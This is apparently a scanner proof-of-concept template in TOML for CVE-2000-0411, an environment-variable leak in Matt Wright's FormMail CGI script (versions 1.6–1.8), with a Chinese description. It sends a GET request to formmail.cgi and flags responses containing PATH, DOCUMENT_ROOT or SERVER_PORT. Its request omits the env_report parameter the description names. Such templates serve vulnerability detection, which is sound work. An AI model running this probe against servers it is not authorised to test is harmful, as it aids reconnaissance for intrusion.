[info]
author = "AVE"
description = "Matt Wright FormMail CGI 脚本（1.6/1.7/1.8 版本）存在环境变量信息泄露漏洞。远程攻击者通过向 formmail.cgi 传递恶意 env_report 参数，可获取服务器端敏感环境变量信息。"
id = "POC-AVE-2000-0339"
name = "Matt Wright FormMail 环境变量泄露漏洞 PoC"
severity = "medium"
tags = ["cve-2000-0411"]
vuln_id = [
    "CVE-2000-0411",
    "AVE-2000-0339",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/cgi-bin/formmail.cgi"
protocol = "http"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "PATH",
    "DOCUMENT_ROOT",
    "SERVER_PORT",
]
